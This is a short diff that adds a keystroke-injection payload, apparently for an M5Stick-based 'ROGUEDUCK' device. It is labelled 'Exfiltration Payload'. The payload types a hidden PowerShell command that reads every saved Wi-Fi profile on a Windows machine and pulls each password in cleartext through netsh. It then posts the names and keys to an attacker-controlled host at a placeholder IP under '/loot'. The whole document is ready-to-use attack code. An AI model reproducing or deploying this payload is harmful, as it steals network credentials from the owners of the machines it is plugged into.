@@ -1,0 +1,3 @@
+REM --- Exfiltration Payload ---
+REM Powershell command to get Wi-Fi profiles and POST to ROGUEDUCK
+STRINGLN powershell -w hidden -Command "$p=netsh wlan show profiles|select-string 'All User Profile'; foreach($prof in $p){$n=$prof.toString().split(':')[1].trim(); $key=(netsh wlan show profile name=$n key=clear|select-string 'Key Content').toString().split(':')[1].trim(); $data=$n+' : '+$key; Invoke-RestMethod -Uri 'http://<CHANGE-TO-YOUR-M5STICKS3-IP>/loot' -Method Post -Body $data}"
